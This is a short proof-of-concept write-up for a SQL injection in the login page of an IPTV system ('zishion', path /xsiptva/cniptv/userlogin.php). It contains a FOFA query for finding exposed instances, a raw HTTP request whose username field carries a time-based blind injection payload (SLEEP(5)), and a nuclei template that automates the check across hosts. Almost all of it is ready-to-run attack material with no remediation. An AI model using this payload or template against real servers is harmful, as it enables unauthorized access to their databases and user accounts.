# fofa

```plain
body="xsiptvp"
```

# poc

```plain
POST /xsiptva/cniptv/userlogin.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 113
Content-Type: application/x-www-form-urlencoded
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36

username=admin' AND (SELECT 6707 FROM (SELECT(SLEEP(5)))mQbf) AND '1'='1&password=admin
```

# nuclei

```plain
id: zishion-userlogin-sqli

info:
  name: zishion userlogin SQL injection
  author: zxf
  severity: high
  metadata:
    fofasearch: body="xsiptvp"

http:
  - raw:
      - |
        POST /xsiptva/cniptv/userlogin.php HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cache-Control: max-age=0
        Connection: keep-alive
        Content-Length: 113
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36

        username=admin' AND (SELECT 6707 FROM (SELECT(SLEEP(5)))mQbf) AND '1'='1&password=admin
        
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && duration >= 5
```

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1740465909617-e64b257c-b677-4cd4-8c08-97341a5a6431.png)

